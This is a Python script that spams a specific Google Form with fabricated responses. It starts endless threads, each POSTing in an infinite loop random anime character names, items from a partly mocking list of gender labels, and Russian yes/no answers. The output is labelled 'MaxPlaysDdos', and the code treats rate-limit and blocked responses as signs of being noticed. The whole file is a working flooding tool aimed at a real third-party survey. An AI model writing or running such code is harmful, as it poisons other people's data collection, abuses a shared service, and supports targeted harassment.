# -*- coding: utf-8 -*-

import requests
import random

from LogPython import LogManager
import requests
LogManager = LogManager()
import threading

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 YaBrowser/17.6.1.749 Yowser/2.5 Safari/537.36'
}

print('\033[36m' + '          _____                    _____                    _____                    _____                    _____                    _____     _____  ')
print('         /\    \                  /\    \                  /\    \                  /\    \                  /\    \                  /\    \   /\    \ ')
print('        /::\____\                /::\    \                /::\    \                /::\    \                /::\    \                /::\____\ /::\____\'')
print('       /:::/    /                \:::\    \              /::::\    \              /::::\    \              /::::\    \              /:::/    //:::/    /')
print('      /:::/    /                  \:::\    \            /::::::\    \            /::::::\    \            /::::::\    \            /:::/    //:::/    / ')
print('     /:::/    /                    \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/    //:::/    /  ')
print('    /:::/____/                      \:::\    \        /:::/  \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/    //:::/    /   ')
print('   /::::\    \                      /::::\    \      /:::/    \:::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/    //:::/    /    ')
print('  /::::::\    \   _____    ____    /::::::\    \    /:::/    / \:::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/    //:::/    /     ')
print(' /:::/\:::\    \ /\    \  /\   \  /:::/\:::\    \  /:::/    /   \:::\ ___\  /:::/\:::\   \:::\ ___\  /:::/\:::\   \:::\    \  /:::/    //:::/    /      ')
print('/:::/  \:::\    /::\____\/::\   \/:::/  \:::\____\/:::/____/     \:::|    |/:::/__\:::\   \:::|    |/:::/__\:::\   \:::\____\/:::/____//:::/____/       ')
print('\::/    \:::\  /:::/    /\:::\  /:::/    \::/    /\:::\    \     /:::|____|\:::\   \:::\  /:::|____|\:::\   \:::\   \::/    /\:::\    \\:::\    \       ')
print(' \/____/ \:::\/:::/    /  \:::\/:::/    / \/____/  \:::\    \   /:::/    /  \:::\   \:::\/:::/    /  \:::\   \:::\   \/____/  \:::\    \\:::\    \      ')
print('          \::::::/    /    \::::::/    /            \:::\    \ /:::/    /    \:::\   \::::::/    /    \:::\   \:::\    \       \:::\    \\:::\    \     ')
print('           \::::/    /      \::::/____/              \:::\    /:::/    /      \:::\   \::::/    /      \:::\   \:::\____\       \:::\    \\:::\    \    ')
print('           /:::/    /        \:::\    \               \:::\  /:::/    /        \:::\  /:::/    /        \:::\   \::/    /        \:::\    \\:::\    \   ')
print('          /:::/    /          \:::\    \               \:::\/:::/    /          \:::\/:::/    /          \:::\   \/____/          \:::\    \\:::\    \  ')
print('         /:::/    /            \:::\    \               \::::::/    /            \::::::/    /            \:::\    \               \:::\    \\:::\    \ ')
print('        /:::/    /              \:::\____\               \::::/    /              \::::/    /              \:::\____\               \:::\____\\:::\____\'')
print('        \::/    /                \::/    /                \::/____/                \::/____/                \::/    /                \::/    / \::/    /')
print('         \/____/                  \/____/                  ~~                       ~~                       \/____/                  \/____/   \/____/ ')
print('                                                                                                                                                        ')


rand_list = ["Yuno", "Ayumu Kasuga Osaka", "Kiri Komori", "Asuka Soryu Langley", "Kotonoha Katsura", "Machi", "Rika Furude", "Ai Enma", "Nausicaä", "Yoko Littner", "Hitagi Senjougahara", "Ika Musume", "Rena Ryuuguu", "Anna Kurauchi", "Miyako", "Poplar Taneshima", "Akira Amatsume", "Himeko Katagiri", "Suiseiseki", "Hitoha Marui", "Ayumu Nishizawa", "Nadeko Sengoku", "Lum", "Aono Morimiya", "Shion Fujino", "Shiki Ryougi", "Lina Inverse", "Aoi Yamada", "Haruko Haruhara", "Yuki Nagato", "Kaede Fuyou", "Chiri Kitsu", "Ayumi Yamada", "Misaki Nakahara", "Megumi Noda", "Hanyuu Furude", "Kafuka Fuura", "Faye Valentine", "Tomoko Kuroki", "Tamaki Kawazoe", "Kino", "Ayu Tsukimiya", "Mion Sonozaki", "Excel", "Fuuko Ibuki", "Rin Kaga", "Kou", "Celty Sturluson", "Ana Coppola", "Nino", "Sayoko Kurosaki",
             "Tsukasa Hiiragi", "Guchuko", "Sun Seto", "Shouko Kirishima", "Balalaika", "Ukyo Kuonji", "Aika Granzchesta", "Nobue Itoh", "Rebecca Miyamoto", "Alice Carroll", "Isumi Saginomiya", "Ichijou", "Chizuru Minamoto", "Chiaki Minami", "Suigintou", "Marii Buratei", "Nano Shinonome", "Akari Akaza", "Murasaki Kuhouin", "Horo", "Konata Izumi", "Riza Hawkeye", "Sora Kajiwara", "Himeko Inaba", "Dorm Leader", "Risa Koizumi", "Sakaki", "Futaba Marui", "Satsuki Kitaoji", "Nori", "Nagisa Furukawa", "Mahoro Andou", "Rakka", "Chihiro Shindou", "Rei Ayanami", "Haruhi Fujioka", "Yuuko Ichihara", "Mai Kawasumi", "Maki Umezaki", "Tsuyuri", "Kana Minami", "Tsumugi Kotobuki", "Mamimi Samejima", "Olivier Mira Armstrong", "Nanami Aoyama", "Kuro Kagami", "Mashiro Shiina", "Yakumo Tsukamoto", "Matsurika Shinouji"]

da_net = ["Да", "Нет"]

genders = ['Agender', 'Androgyne', 'Androgynous', 'Bigender', 'Cis', 'FTM', 'Gender Fluid', 'Gender Nonconforming', 'Gender Questioning',
           'Gender Variant', 'Genderqueer', 'Neither', 'Neutrois', 'Non-binary', 'Other', 'Pangender', 'Two-spirit', 'Anongender', 'Cavusgender',
           'Zodiacgender', 'Aesthetgender', 'Affectugender', 'Digigender', 'Egogender']

molitva = ''
f = open('molitva.txt', 'r', encoding='utf-8').readlines()

for i in f:
    molitva += i

def raid(a, b, c):
    i = -1
    while True:
        out = requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSc9CFL6d7qKMJUzKl-FUGWONREe6y9PygPzDIVkeDSyU4-bpg/formResponse",
                            data={
                                "entry.1508740013": a,
                                "entry.297670832": b,
                                "entry.347858582": c,
                                "entry.347858582_sentinel": "",
                                "fvv": "1",
                                "draftResponse": '[null,null,"225161449973291891"]',
                                "pageHistory": "0",
                                "fbzx": "225161449973291891"
                            },
                            headers=headers)

        if out.status_code == 200:
            status = "OK"
        elif out.status_code == 429:
            status = "TooManyRequests (хватит на сегодня)"
        elif out.status_code == 405:
            status = "MethodNotAllowed (Вас заметили)"
        else:
            status = "Undefined"

        i += 1
        
        LogManager.info(f"{out} === {i + 1} === MaxPlaysDdos <<== ==>> {status}")
     
i = 0        
while True:
    threading.Thread(target = raid, args = (random.choice(rand_list), random.choice(genders), random.choice(da_net))).start()
    # LogManager.info(f" === {i + 1} === MaxPlaysDdos ===")
    i += 1